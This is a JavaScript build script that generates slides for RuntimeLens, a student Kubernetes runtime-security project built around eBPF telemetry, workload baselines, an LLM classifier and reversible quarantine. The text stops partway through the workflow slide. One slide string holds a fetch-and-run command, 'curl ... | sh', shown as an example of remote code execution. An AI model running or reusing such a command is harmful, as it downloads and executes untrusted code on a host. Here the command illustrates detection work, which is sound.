// RuntimeLens presentation deck — simple words, light professional theme.
//
// Theme: "Cloud & Control" — a light cool-blue wash built for a Cloud Security
// and SRE course. White cards, steel-blue accents, status colors only where a
// decision is being shown. Playfair Display is reserved for hero titles; Geist
// carries everything else; Geist Mono for anything typed at an API.
//
// Usage: node research/deck/build_deck.js

const fs = require("node:fs");
const path = require("node:path");
const PptxGenJS = require("pptxgenjs");

const ROOT = path.resolve(__dirname, "..", "..");
const FIGS = path.join(ROOT, "research", "figures");
const ASSETS = path.join(ROOT, "research", "deck", "assets");
const OUT_DIR = path.join(ROOT, "docs", "presentation");

const C = {
  bg: "EDF3FA",       // light blue-white slide wash
  card: "FFFFFF",
  card2: "F5F9FD",
  ink: "14243A",
  body: "33465C",
  muted: "5E718A",
  line: "D8E0EA",
  steel: "0F5E8E",    // primary accent — the "cloud" in cloud security
  sky: "1B8FD6",      // supporting accent
  teal: "1296B8",
  green: "1F9D6B",
  greenSoft: "EAF6EF",
  amber: "C97B12",
  amberSoft: "FBF3E2",
  red: "C8433C",
  redSoft: "FBECEA",
  blueSoft: "E9F2FA",
  tealSoft: "E8F6F8",
  steelSoft: "EAEEF4",
};

const SANS = "Geist";
const HERO = "Playfair Display";
const MONO = "Geist Mono";

const W = 13.333;
const H = 7.5;
const M = 0.62;
const RIGHT = { x: 8.55, w: W - M - 8.55 };

const pptx = new PptxGenJS();
pptx.layout = "LAYOUT_WIDE";
pptx.author = "Himanshu Kumar, Altaf Raja, Kamal Nayan Kumar";
pptx.company = "IIIT Dharwad, Department of Computer Science and Engineering";
pptx.title = "RuntimeLens: Catching runtime attacks in Kubernetes by knowing each workload's job description";
pptx.subject = "Cloud Security and SRE project presentation";

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

function slide() {
  const s = pptx.addSlide();
  s.background = { color: C.bg };
  return s;
}

/** Repeating motif: an icon sits in a small circle. */
function mark(s, x, y, d, color) {
  s.addShape(pptx.ShapeType.ellipse, {
    x, y, w: d, h: d,
    fill: { color },
    line: { type: "none" },
  });
}

function card(s, x, y, w, h, fill = C.card) {
  s.addShape(pptx.ShapeType.roundRect, {
    x, y, w, h, rectRadius: 0.1,
    fill: { color: fill },
    line: { color: C.line, width: 0.75 },
    shadow: { type: "outer", color: "9FB8D0", opacity: 0.3, blur: 7, offset: 2, angle: 45 },
  });
}

function kicker(s, x, y, text, color = C.steel) {
  mark(s, x, y + 0.02, 0.2, color);
  s.addText(text.toUpperCase(), {
    x: x + 0.33, y, w: 6.5, h: 0.3, margin: 0,
    fontFace: SANS, fontSize: 11, bold: true, color, charSpacing: 1.8, valign: "middle",
  });
}

function titleBlock(s, kick, title, sub) {
  s.addShape(pptx.ShapeType.rect, {
    x: 0, y: 0, w: W, h: 1.78,
    fill: { color: "F1F6FC" }, line: { type: "none" },
  });
  s.addShape(pptx.ShapeType.rect, {
    x: 0, y: 1.78, w: W, h: 0.03,
    fill: { color: C.steel, transparency: 72 }, line: { type: "none" },
  });
  kicker(s, M, 0.34, kick);
  s.addText(title, {
    x: M, y: 0.68, w: W - 2 * M, h: 0.72, margin: 0,
    fontFace: SANS, fontSize: 27, bold: true, color: C.ink, align: "left", valign: "middle",
  });
  if (sub) {
    s.addText(sub, {
      x: M, y: 1.42, w: W - 2 * M, h: 0.42, margin: 0,
      fontFace: SANS, fontSize: 13, color: C.muted, align: "left", valign: "middle",
    });
  }
}

function footer(s, n) {
  s.addText("RuntimeLens  |  Cloud Security & SRE  |  IIIT Dharwad", {
    x: M, y: H - 0.38, w: 7.5, h: 0.24, margin: 0,
    fontFace: SANS, fontSize: 9, color: C.muted, align: "left",
  });
  s.addShape(pptx.ShapeType.cloud, {
    x: W - M - 0.62, y: H - 0.40, w: 0.42, h: 0.27,
    fill: { color: C.steel }, line: { type: "none" },
  });
  s.addText(String(n).padStart(2, "0"), {
    x: W - M - 0.16, y: H - 0.38, w: 0.32, h: 0.24, margin: 0,
    fontFace: MONO, fontSize: 9, color: C.muted, align: "right",
  });
}

function stat(s, x, y, w, h, value, label, color) {
  card(s, x, y, w, h);
  s.addText(value, {
    x: x + 0.22, y: y + 0.1, w: w - 0.44, h: 0.52, margin: 0,
    fontFace: SANS, fontSize: 26, bold: true, color, align: "left", valign: "middle",
  });
  s.addText(label, {
    x: x + 0.22, y: y + 0.6, w: w - 0.44, h: h - 0.72, margin: 0,
    fontFace: SANS, fontSize: 10, color: C.muted, align: "left", valign: "top", lineSpacing: 13,
  });
}

function chip(s, x, y, w, h, text, fill, color, fontSize = 10.5) {
  s.addShape(pptx.ShapeType.roundRect, { x, y, w, h, rectRadius: 0.08, fill: { color: fill }, line: { type: "none" } });
  s.addText(text, {
    x, y, w, h, margin: 0, fontFace: SANS, fontSize, bold: true, color,
    align: "center", valign: "middle",
  });
}

/** Soft cloud watermark, top-right. Two sizes for title/closing. */
function cloudMark(s, cx, cy, scale, color = C.sky, transparency = 78) {
  s.addShape(pptx.ShapeType.cloud, {
    x: cx - 1.55 * scale, y: cy - 0.85 * scale,
    w: 3.1 * scale, h: 1.7 * scale,
    fill: { color, transparency },
    line: { color, width: 1.5, transparency: 40 },
  });
}

/** Faint line-art glyphs used as card watermarks. */
function glyphPod(s, x, y, d, color, tint) {
  s.addShape(pptx.ShapeType.roundRect, {
    x, y, w: d, h: d, rectRadius: d * 0.18,
    fill: { color: tint }, line: { color, width: 1.4 },
  });
  s.addShape(pptx.ShapeType.roundRect, {
    x: x + d * 0.22, y: y + d * 0.22, w: d * 0.56, h: d * 0.42,
    rectRadius: d * 0.08, fill: { color: "FFFFFF" }, line: { color, width: 1.0 },
  });
  for (let i = 0; i < 3; i += 1) {
    s.addShape(pptx.ShapeType.ellipse, {
      x: x + d * 0.22 + i * d * 0.2, y: y + d * 0.74, w: d * 0.1, h: d * 0.1,
      fill: { color }, line: { type: "none" },
    });
  }
}

function glyphTimeline(s, x, y, w, color, tint) {
  const h = w * 0.42;
  s.addShape(pptx.ShapeType.roundRect, {
    x, y, w, h, rectRadius: h * 0.18,
    fill: { color: tint }, line: { color, width: 1.4 },
  });
  s.addShape(pptx.ShapeType.rect, {
    x: x + w * 0.15, y: y + h * 0.5 - 0.015, w: w * 0.7, h: 0.03,
    fill: { color }, line: { type: "none" },
  });
  [0.22, 0.5, 0.78].forEach((t) => {
    s.addShape(pptx.ShapeType.ellipse, {
      x: x + w * t - h * 0.09, y: y + h * 0.5 - h * 0.09, w: h * 0.18, h: h * 0.18,
      fill: { color: "FFFFFF" }, line: { color, width: 1.2 },
    });
  });
}

function glyphDoc(s, x, y, d, color, tint) {
  s.addShape(pptx.ShapeType.roundRect, {
    x, y, w: d * 0.82, h: d,
    rectRadius: d * 0.1,
    fill: { color: tint }, line: { color, width: 1.4 },
  });
  [0.2, 0.38, 0.56, 0.74].forEach((t, i) => {
    s.addShape(pptx.ShapeType.rect, {
      x: x + d * 0.16, y: y + d * t, w: d * (i === 3 ? 0.34 : 0.5), h: d * 0.045,
      fill: { color }, line: { type: "none" },
    });
  });
}

function glyphShield(s, x, y, d, color, tint) {
  s.addShape(pptx.ShapeType.hexagon, {
    x, y, w: d, h: d * 1.08,
    fill: { color: tint }, line: { color, width: 1.4 }, rotate: 0,
  });
  s.addShape(pptx.ShapeType.rect, {
    x: x + d * 0.30, y: y + d * 0.56, w: d * 0.20, h: d * 0.08,
    fill: { color }, line: { type: "none" }, rotate: 45,
  });
  s.addShape(pptx.ShapeType.rect, {
    x: x + d * 0.37, y: y + d * 0.47, w: d * 0.38, h: d * 0.08,
    fill: { color }, line: { type: "none" }, rotate: -45,
  });
}

function pngSize(file) {
  const buf = fs.readFileSync(file);
  if (buf.readUInt32BE(0) !== 0x89504e47) return null;
  return { w: buf.readUInt32BE(16), h: buf.readUInt32BE(20) };
}
function img(s, file, x, y, w) {
  const p = path.join(FIGS, file);
  if (!fs.existsSync(p)) return null;
  const size = pngSize(p);
  const h = size ? w * (size.h / size.w) : w * 0.55;
  s.addShape(pptx.ShapeType.roundRect, {
    x: x - 0.18, y: y - 0.18, w: w + 0.36, h: h + 0.36,
    rectRadius: 0.12,
    fill: { color: C.card },
    line: { color: C.line, width: 0.75 },
    shadow: { type: "outer", color: "9FB8D0", opacity: 0.3, blur: 8, offset: 2, angle: 45 },
  });
  s.addImage({ path: p, x, y, w, h });
  return { w, h };
}

// ---------------------------------------------------------------------------
// data
// ---------------------------------------------------------------------------

function loadResults() {
  const dir = path.join(ROOT, "research", "results");
  const out = { arms: [], asr: [], live: null };
  if (!fs.existsSync(dir)) return out;
  const analysis = path.join(dir, "live_analysis.json");
  if (fs.existsSync(analysis)) {
    const data = JSON.parse(fs.readFileSync(analysis, "utf8"));
    if (data.arms && data.arms.length) out.arms = data.arms;
  }
  const aggregate = path.join(dir, "adversarial_aggregate.json");
  if (fs.existsSync(aggregate)) {
    // turn the aggregate into the flat per-arm list the ASR chart consumes
    out.asr = JSON.parse(fs.readFileSync(aggregate, "utf8")).arms || [];
  }
  return out;
}
const R = loadResults();
const headline = R.arms.slice(0, 3).sort((a, b) => (b.n_incidents || 0) - (a.n_incidents || 0))[0] || null;

let SLIDE = 0;
const next = () => ++SLIDE;

// ---------------------------------------------------------------------------
// 1. TITLE
// ---------------------------------------------------------------------------
{
  const s = pptx.addSlide();
  s.background = { path: path.join(ASSETS, "bg_hero.png") };

  kicker(s, 0.92, 0.92, "Cloud Security and SRE  ·  2026");
  s.addText("RuntimeLens", {
    x: 0.92, y: 1.32, w: 9.6, h: 1.15, margin: 0,
    fontFace: HERO, fontSize: 60, bold: true, color: C.ink,
  });
  s.addText("Teaching a Kubernetes cluster\nto tell an attack from a bad day.", {
    x: 0.92, y: 2.6, w: 7.2, h: 1.3, margin: 0,
    fontFace: HERO, fontSize: 23, color: C.steel, lineSpacing: 31, valign: "top",
  });

  const chips = [
    ["Catches runtime attacks", 2.05],
    ["Fewer false alarms", 1.82],
    ["Safe, reversible response", 2.2],
  ];
  let cx = 0.92;
  chips.forEach(([c, cw]) => {
    chip(s, cx, 4.2, cw, 0.4, c, "FFFFFF", C.steel, 9.5);
    cx += cw + 0.12;
  });

  s.addShape(pptx.ShapeType.line, {
    x: 0.92, y: 5.05, w: 11.5, h: 0,
    line: { color: C.line, width: 1 },
  });

  s.addText([
    { text: "Himanshu Kumar", options: { bold: true, color: C.ink } },
    { text: "  ·  23BCS055", options: { color: C.muted, breakLine: true } },
    { text: "Altaf Raja", options: { bold: true, color: C.ink } },
    { text: "  ·  23BCS011", options: { color: C.muted, breakLine: true } },
    { text: "Kamal Nayan Kumar", options: { bold: true, color: C.ink } },
    { text: "  ·  23BDS026", options: { color: C.muted } },
  ], {
    x: 0.92, y: 5.25, w: 4.6, h: 1.35, margin: 0,
    fontFace: SANS, fontSize: 12, lineSpacing: 19, align: "left", valign: "top",
  });

  s.addText([
    { text: "Faculty Guide  ", options: { color: C.muted } },
    { text: "Dr. Malay Kumar", options: { bold: true, color: C.ink, breakLine: true } },
    { text: "IIIT Dharwad", options: { color: C.muted } },
  ], {
    x: 6.3, y: 5.25, w: 5.0, h: 1.0, margin: 0,
    fontFace: SANS, fontSize: 12, lineSpacing: 19, align: "left", valign: "top",
  });

  next();
}

// ---------------------------------------------------------------------------
// 2. PROBLEM
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "The problem", "Falco sees the syscall.\nIt cannot read the room.", "");

  const a = {
    x: M, tint: C.greenSoft, tag: "COULD BE FINE", tagC: C.green,
    head: "A debug session",
    code: "kubectl exec -it debug-pod -- /bin/sh",
    body: "The pod is allowed to have a shell. The operator is on call. Everything is normal.",
    foot: "Falco raises the same alert either way.",
  };
  const b = {
    x: M + 6.35, tint: C.redSoft, tag: "COULD BE AN ATTACK", tagC: C.red,
    head: "Remote code execution",
    code: "curl -s http://10.0.4.7/x.sh | sh",
    body: "The same pod. The same syscall. Nothing about the event says who started it.",
    foot: "Falco raises the same alert, again.",
  };
  [a, b].forEach((c) => {
    card(s, c.x, 1.95, 6.0, 3.55, c.tint);
    s.addText(c.tag, {
      x: c.x + 0.3, y: 2.15, w: 3.6, h: 0.26, margin: 0,
      fontFace: SANS, fontSize: 10, bold: true, color: c.tagC, charSpacing: 1.5,
    });
    s.addText(c.head, {
      x: c.x + 0.3, y: 2.45, w: 5.4, h: 0.42, margin: 0,
      fontFace: SANS, fontSize: 19, bold: true, color: C.ink, valign: "middle",
    });
    s.addText(c.code, {
      x: c.x + 0.3, y: 3.02, w: 5.4, h: 0.3, margin: 0,
      fontFace: MONO, fontSize: 10, color: c.tagC, valign: "middle",
    });
    s.addText(c.body, {
      x: c.x + 0.3, y: 3.48, w: 5.35, h: 1.0, margin: 0,
      fontFace: SANS, fontSize: 11.5, color: C.body, lineSpacing: 16, valign: "top",
    });
    s.addText(c.foot, {
      x: c.x + 0.3, y: 4.85, w: 5.4, h: 0.35, margin: 0,
      fontFace: SANS, fontSize: 11, bold: true, color: c.tagC, valign: "middle",
    });
  });

  const stats = [
    ["18.4%", "of benign traffic\ntrips default Falco rules", C.red],
    ["0.333", "Macro-F1 for the stock\nrule engine on our task", C.red],
    ["~68%", "of the ambiguous cases\nneed cluster context to resolve", C.amber],
  ];
  stats.forEach((st, i) => {
    stat(s, M + i * 4.28, 5.85, 3.96, 1.1, st[0], st[1], st[2]);
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 3. WHY EXISTING TOOLS FALL SHORT
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Why this is hard", "Three things current tools cannot do", "");

  const cards = [
    {
      n: "01", t: "Know what the workload is",
      d: "A shell in a debug pod is fine. The same shell in a payment pod is not.\n\nNo rule engine ships with a job description for every workload.",
      tag: "Workload context",
    },
    {
      n: "02", t: "See a story, not a syscall",
      d: "Real attacks unfold in steps: token read, then API call, then connection out.\n\nOne syscall rule cannot put those steps together.",
      tag: "Temporal correlation",
    },
    {
      n: "03", t: "Act without breaking production",
      d: "A detector that stops a healthy service gets switched off.\n\nRuntimeLens can only take a reversible action, only at high confidence.",
      tag: "Safe response",
    },
  ];
  cards.forEach((c, i) => {
    const x = M + i * 4.28;
    card(s, x, 1.95, 3.96, 4.6);
    s.addShape(pptx.ShapeType.ellipse, {
      x: x + 0.3, y: 2.3, w: 0.52, h: 0.52, fill: { color: C.steel }, line: { type: "none" },
    });
    s.addText(c.n, {
      x: x + 0.3, y: 2.3, w: 0.52, h: 0.52, margin: 0,
      fontFace: MONO, fontSize: 12, bold: true, color: "FFFFFF", align: "center", valign: "middle",
    });
    s.addText(c.tag, {
      x: x + 0.98, y: 2.3, w: 2.7, h: 0.52, margin: 0,
      fontFace: SANS, fontSize: 9.5, bold: true, color: C.steel, charSpacing: 1.3, valign: "middle",
    });
    s.addText(c.t, {
      x: x + 0.3, y: 3.02, w: 3.36, h: 0.36, margin: 0,
      fontFace: SANS, fontSize: 14.5, bold: true, color: C.ink, valign: "middle",
    });
    s.addText(c.d, {
      x: x + 0.3, y: 3.5, w: 3.34, h: 1.7, margin: 0,
      fontFace: SANS, fontSize: 12, color: C.body, lineSpacing: 18, valign: "top",
    });

    const gx = x + 2.5;
    const gy = 5.06;
    if (i === 0) glyphPod(s, gx, gy, 1.12, "8FB6D2", "EEF5FB");
    if (i === 1) glyphTimeline(s, x + 0.3, gy + 0.24, 1.5, "8FB6D2", "EEF5FB");
    if (i === 2) glyphShield(s, gx + 0.02, gy + 0.02, 1.05, "8FB6D2", "EEF5FB");
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 4. WHAT THE RESEARCH SAYS
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Literature survey", "What others built, and where they stopped",
    "A systematic read of runtime-security, ML-for-Kubernetes and LLM-for-security work (2022-2026).");

  const cols = [
    {
      x: M, accent: C.steel, name: "eBPF engines",
      foot: "Fast, but blind to context.",
      items: [
        ["Falco, Tetragon, Tracee", "Detect kernel events fast. A 2025 benchmark on identical clusters found 100% detection for all three — they differ in speed, not in what they catch."],
        ["GCID, BPFence", "Proof that rule engines cannot express multi-step correlation: no cross-event join operator exists in Tetragon's policy grammar."],
      ],
    },
    {
      x: M + 4.28, accent: C.sky, name: "Baselines and ML",
      foot: "Learned from data, not declared.",
      items: [
        ["Shadowkube, architecture profiling", "Behaviour baselines cut false alarms — but they are learned from data, never declared by an operator."],
        ["Leaky-split warning", "The same models score 77-80% on unseen attacks but >99.5% on a random split. We pre-registered grouped splits for exactly this reason."],
      ],
    },
    {
      x: M + 8.56, accent: C.teal, name: "LLMs in security",
      foot: "Constrained output or nothing.",
      items: [
        ["CORTEX, REFINE, LLM-FPR", "LLMs triage alerts well — but only when output is constrained and a deterministic check runs behind them."],
        ["GenKubeSec, OCR-APT", "An LLM beats three industry scanners on Kubernetes config (F1 0.99) — on config files, not on live runtime events."],
        ["LogInject (88%)", "Raw telemetry in a prompt is attackable. Any LLM layer over logs must sanitise inputs or the attacker wins."],
      ],
    },
  ];
  cols.forEach((g) => {
    card(s, g.x, 1.95, 3.96, 4.2);
    s.addShape(pptx.ShapeType.ellipse, {
      x: g.x + 0.3, y: 2.22, w: 0.44, h: 0.44, fill: { color: g.accent }, line: { type: "none" },
    });
    s.addText(g.name, {
      x: g.x + 0.9, y: 2.22, w: 2.8, h: 0.44, margin: 0,
      fontFace: SANS, fontSize: 14, bold: true, color: C.ink, valign: "middle",
    });
    s.addText(g.foot, {
      x: g.x + 0.3, y: 2.76, w: 3.36, h: 0.28, margin: 0,
      fontFace: SANS, fontSize: 10, italic: true, color: C.muted, valign: "middle",
    });

    let y = 3.16;
    const step = g.items.length >= 3 ? 0.93 : 1.02;
    g.items.forEach((it) => {
      s.addText(it[0], {
        x: g.x + 0.3, y, w: 3.4, h: 0.26, margin: 0,
        fontFace: SANS, fontSize: 10.5, bold: true, color: g.accent, valign: "top",
      });
      s.addText(it[1], {
        x: g.x + 0.3, y: y + 0.25, w: 3.36, h: 0.66, margin: 0,
        fontFace: SANS, fontSize: 9.5, color: C.body, lineSpacing: 12.5, valign: "top",
      });
      y += step;
    });
  });

  card(s, M, 6.38, W - 2 * M, 0.6, C.blueSoft);
  s.addText([
    { text: "The gap we found:  ", options: { bold: true, color: C.steel } },
    { text: "no published system combines all five: eBPF telemetry, an operator-declared per-workload baseline, one correlated window, a typed-decision LLM classifier, and a hash-chained audit trail.", options: { color: C.body } },
  ], {
    x: M + 0.3, y: 6.43, w: W - 2 * M - 0.6, h: 0.5, margin: 0,
    fontFace: SANS, fontSize: 11, valign: "middle",
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 5. CAPABILITY MATRIX
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Literature survey", "Nobody does all five",
    "One column per capability we needed. Filled circles = present, hollow = absent.");

  const caps = [
    "eBPF-level\nruntime telemetry",
    "Operator-declared\nworkload baseline",
    "Multi-source\ntemporal fusion",
    "Typed-decision\nLLM classifier",
    "Hash-chained audit\n+ auto-rollback",
  ];
  const rows = [
    ["Falco / Tetragon / Tracee", [1, 0, 0, 0, 0], C.muted],
    ["Shadowkube (learned baselines)", [1, 0, 1, 0, 0], C.sky],
    ["GenKubeSec, OCR-APT (LLM + agents)", [1, 0, 1, 1, 0], C.teal],
    ["RuntimeLens (this project)", [1, 1, 1, 1, 1], C.steel],
  ];

  const gridX = M + 3.6;
  const gridW = W - 2 * M - 3.6;
  const colW = gridW / caps.length;

  caps.forEach((c, i) => {
    s.addText(c, {
      x: gridX + i * colW, y: 2.0, w: colW, h: 0.66, margin: 0,
      fontFace: SANS, fontSize: 10.5, bold: true, color: C.body, align: "center", valign: "middle",
    });
  });

  rows.forEach((r, ri) => {
    const y = 2.82 + ri * 1.0;
    const isLast = ri === rows.length - 1;
    s.addShape(pptx.ShapeType.roundRect, {
      x: M, y: y - 0.14, w: W - 2 * M, h: 0.98, rectRadius: 0.08,
      fill: { color: isLast ? "E7F1FA" : (ri % 2 === 0 ? "FFFFFF" : "F4F8FC") },
      line: { color: isLast ? C.steel : (ri % 2 === 0 ? C.line : "F4F8FC"), width: isLast ? 1.2 : 0.75 },
    });
    s.addText(r[0], {
      x: M + 0.28, y, w: 3.2, h: 0.7, margin: 0,
      fontFace: SANS, fontSize: 12.5, bold: isLast, color: isLast ? C.ink : C.body, valign: "middle",
    });
    r[1].forEach((v, ci) => {
      const cx = gridX + ci * colW + colW / 2;
      s.addShape(pptx.ShapeType.ellipse, {
        x: cx - 0.22, y: y + 0.15, w: 0.44, h: 0.44,
        fill: { color: v ? r[2] : "E3EAF1" }, line: { type: "none" },
      });
      s.addText(v ? "✓" : "—", {
        x: cx - 0.22, y: y + 0.15, w: 0.44, h: 0.44, margin: 0,
        fontFace: SANS, fontSize: 14, bold: true,
        color: v ? "FFFFFF" : C.muted, align: "center", valign: "middle",
      });
    });
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 6. OUR SOLUTION
// ---------------------------------------------------------------------------
{
  const s = slide();
  kicker(s, M, 0.34, "Our solution");
  s.addText("Give the classifier the job description,\nand never let it push the button.", {
    x: M, y: 0.68, w: 11.5, h: 1.35, margin: 0,
    fontFace: HERO, fontSize: 26, bold: true, color: C.ink, lineSpacing: 33, valign: "top",
  });

  const steps = [
    {
      n: "01", t: "Correlate", c: C.steel,
      d: "Join five live data feeds into one event, within a 30-second window, per pod.",
    },
    {
      n: "02", t: "Baseline", c: C.sky,
      d: "Each workload has a YAML file that says what it is allowed to do.",
    },
    {
      n: "03", t: "Decide", c: C.teal,
      d: "An LLM answers six fixed questions about the event. It cannot freelance.",
    },
    {
      n: "04", t: "Act safely", c: C.green,
      d: "A deterministic policy engine picks log, alert, review or quarantine.",
    },
  ];
  steps.forEach((p, i) => {
    const x = M + i * 3.09;
    card(s, x, 2.5, 2.88, 3.2);
    s.addShape(pptx.ShapeType.rect, {
      x, y: 2.5, w: 0.05, h: 3.2, fill: { color: p.c }, line: { type: "none" },
    });
    s.addText(p.n, {
      x: x + 0.28, y: 2.68, w: 1.2, h: 0.5, margin: 0,
      fontFace: MONO, fontSize: 22, bold: true, color: p.c,
    });
    s.addText(p.t, {
      x: x + 0.28, y: 3.18, w: 2.32, h: 0.36, margin: 0,
      fontFace: SANS, fontSize: 17, bold: true, color: C.ink, valign: "middle",
    });
    s.addText(p.d, {
      x: x + 0.28, y: 3.62, w: 2.3, h: 1.1, margin: 0,
      fontFace: SANS, fontSize: 10.5, color: C.body, lineSpacing: 15, valign: "top",
    });

    const gx = x + 1.62;
    const gy = 4.9;
    if (i === 0) glyphTimeline(s, x + 0.28, gy + 0.18, 1.3, "9DBCD6", "F1F6FB");
    if (i === 1) glyphPod(s, gx, gy, 0.86, "9DBCD6", "F1F6FB");
    if (i === 2) glyphDoc(s, gx + 0.05, gy, 0.8, "9DBCD6", "F1F6FB");
    if (i === 3) glyphShield(s, gx + 0.02, gy - 0.02, 0.8, "9DBCD6", "F1F6FB");

    if (i < steps.length - 1) {
      s.addText("→", {
        x: x + 2.86, y: 3.9, w: 0.26, h: 0.3, margin: 0,
        fontFace: SANS, fontSize: 14, bold: true, color: C.steel, align: "center", valign: "middle",
      });
    }
  });

  card(s, M, 6.15, W - 2 * M, 0.62, C.blueSoft);
  s.addText([
    { text: "The research question:  ", options: { bold: true, color: C.steel } },
    { text: "does knowing the job description change what the model decides? We pre-registered the answer as a hypothesis before touching the test split.", options: { color: C.body } },
  ], {
    x: M + 0.3, y: 6.2, w: W - 2 * M - 0.6, h: 0.52, margin: 0,
    fontFace: SANS, fontSize: 11.5, valign: "middle",
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 7. ARCHITECTURE
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Architecture", "Five feeds in, one safe action out", "");

  const bands = [
    { label: "COLLECT", tint: C.blueSoft, accent: C.steel,
      items: ["Falco eBPF syscalls", "Kubernetes audit log", "Cilium Hubble flows", "Prometheus metrics", "Trivy scans"] },
    { label: "JOIN & CLEAN", tint: C.tealSoft, accent: C.teal,
      items: ["Source normalisers", "±30s correlation window", "Strip secrets & injections"] },
    { label: "BASELINE", tint: "FBF3E2", accent: C.amber,
      items: ["Per-workload YAML profile", "Compute the deviation list"] },
    { label: "DECIDE", tint: "EDEAF8", accent: C.sky,
      items: ["Rule engine", "Random Forest", "ScaleDown Classify-1", "Typed-decision adapter"] },
    { label: "POLICY + ACT", tint: C.greenSoft, accent: C.green,
      items: ["Safety overrides", "Confidence gate ≥ 0.70", "log / alert / review / quarantine"] },
  ];
  let y = 1.95;
  const bandH = 0.8;
  const bandGap = 0.1;
  bands.forEach((b, bi) => {
    s.addText(b.label, {
      x: M, y: y + 0.28, w: 1.5, h: 0.3, margin: 0,
      fontFace: SANS, fontSize: 9, bold: true, color: b.accent, charSpacing: 1.2, valign: "middle",
    });
    const n = b.items.length;
    const total = W - 2 * M - 1.66;
    const gap = 0.14;
    const bw = (total - gap * (n - 1)) / n;
    b.items.forEach((it, i) => {
      const x = M + 1.66 + i * (bw + gap);
      card(s, x, y, bw, bandH, b.tint);
      s.addText(it, {
        x: x + 0.08, y: y + 0.06, w: bw - 0.16, h: bandH - 0.12, margin: 0,
        fontFace: SANS, fontSize: 10, bold: true, color: C.ink, align: "center", valign: "middle", lineSpacing: 13,
      });
    });
    if (bi < bands.length - 1) {
      s.addText("↓", {
        x: M + 0.42, y: y + bandH - 0.03, w: 0.34, h: 0.18, margin: 0,
        fontFace: SANS, fontSize: 11, bold: true, color: "9FB8D0", align: "center", valign: "middle",
      });
    }
    y += bandH + bandGap;
  });

  s.addText("Every decision is appended to a SHA-256 hash chain, so nobody can delete the evidence after the fact.",
    { x: M, y: y + 0.1, w: W - 2 * M, h: 0.32, margin: 0,
      fontFace: SANS, fontSize: 10, italic: true, color: C.muted, align: "center", valign: "middle" });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 8. WHAT WE BUILT WITH
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "Tech stack", "What it runs on", "Everything runs locally in a kind cluster. Nothing in the evaluation path is simulated.");

  const groups = [
    {
      x: M, title: "Telemetry", accent: C.steel,
      rows: [
        ["Falco 0.38+", "eBPF syscall probe on containerised calls"],
        ["Kubernetes audit", "every verb + subresource (pods/exec, secrets/get)"],
        ["Cilium 1.16 + Hubble", "eBPF network flows at L3-L7"],
        ["Prometheus + cAdvisor", "CPU and memory envelopes per pod"],
        ["Trivy", "static image scan output"],
      ],
    },
    {
      x: M + 4.28, title: "Core", accent: C.sky,
      rows: [
        ["Python 3.12 + uv", "typed implementation, pydantic everywhere"],
        ["Canonical event schema", "one shape for all five sources"],
        ["scikit-learn", "Random Forest reference baseline"],
        ["SHA-256 hash chain", "append-only tamper-evident audit log"],
      ],
    },
    {
      x: M + 8.56, title: "Model layer", accent: C.teal,
      rows: [
        ["ScaleDown Classify-1", "Jev-compatible typed-decisions API"],
        ["Schema-constrained decoding", "same contract on open-weight models"],
        ["Llama Guard 4 + Nemotron", "prompt-injection guards (NIM, free)"],
        ["Deterministic overrides", "physical facts never come from the model"],
      ],
    },
  ];
  groups.forEach((g) => {
    card(s, g.x, 1.95, 3.96, 4.32);
    s.addText(g.title.toUpperCase(), {
      x: g.x + 0.3, y: 2.15, w: 3.4, h: 0.3, margin: 0,
      fontFace: SANS, fontSize: 10.5, bold: true, color: g.accent, charSpacing: 1.8,
    });
    let y = 2.62;
    g.rows.forEach((r) => {
      s.addText(r[0], {
        x: g.x + 0.3, y, w: 3.4, h: 0.26, margin: 0,
        fontFace: SANS, fontSize: 11.5, bold: true, color: C.ink,
      });
      s.addText(r[1], {
        x: g.x + 0.3, y: y + 0.24, w: 3.4, h: 0.4, margin: 0,
        fontFace: SANS, fontSize: 10, color: C.muted, lineSpacing: 13,
      });
      y += 0.72;
    });
  });

  s.addText("Everything above runs in one kind cluster on a laptop. The only paid dependency is the classifier API, and the same typed contract runs on free open-weight models.", {
    x: M, y: 6.55, w: W - 2 * M, h: 0.34, margin: 0,
    fontFace: SANS, fontSize: 10.5, italic: true, color: C.muted, valign: "middle",
  });

  footer(s, next());
}

// ---------------------------------------------------------------------------
// 9. WORKFLOW — ONE INCIDENT
// ---------------------------------------------------------------------------
{
  const s = slide();
  titleBlock(s, "How it works", "One real incident, start to finish",
    "A shell spawn in tenant-a/api-service. Here is what happens, step by step.");

  const steps = [
    ["1", "Falco alerts", "Syscall: /bin/sh in a payment pod"],
    ["2", "Audit matches", "API shows the exec request came from a service account, not a human"],
    ["3", "Baseline checks", "api-service is not allowed to run shells"],
    ["4", "Facts extracted", "Root user, no host mount, container privileges unchanged"],
    ["5", "Model decides", "privilege_abuse, p = 0.88, severity 4.4"],
    ["6", "Gate runs", "Confidence 0.88 ≥ 0.70 · no contradictions · action: quarantine"],
    ["7", "Pod quarantined", "NetworkPolicy isolation + label, 15-min auto-rollback"],
    ["8", "Evidence sealed", "SHA-256 hash-chained record appended"],
  ];

  const bw = 1.40;
  const gap = 0.127;
  steps.forEach((st, i) => {
    const x = M + i * (bw + gap);
    card(s, x, 2.0, bw, 2.28);
    s.addShape(pptx.ShapeType.ellipse, {
      x: x + bw / 2 - 0.23, y: 2.16, w: 0.46, h: 0.46, fill: { color: C.steel }, line: { type: "none" },
    });
    s.addText(st[0], {
      x: x + bw / 2 - 0.23, y: 2.16, w: 0.46, h: 0.46, margin: 0,
      fontFace: MONO, fontSize: 15, bold: true, color: "FFFFFF", align: "center", valign: "middle",
    });
    s.addText(st[1], {
      x: x + 0.07, y: 2.72, w: bw - 0.14, h: 0.28, margin: 0,
      fontFace: SANS, fontSize: 10.5, bold: true, color: C.ink, align: "center", valign: "top",
    });
    s.addText(st[2], {
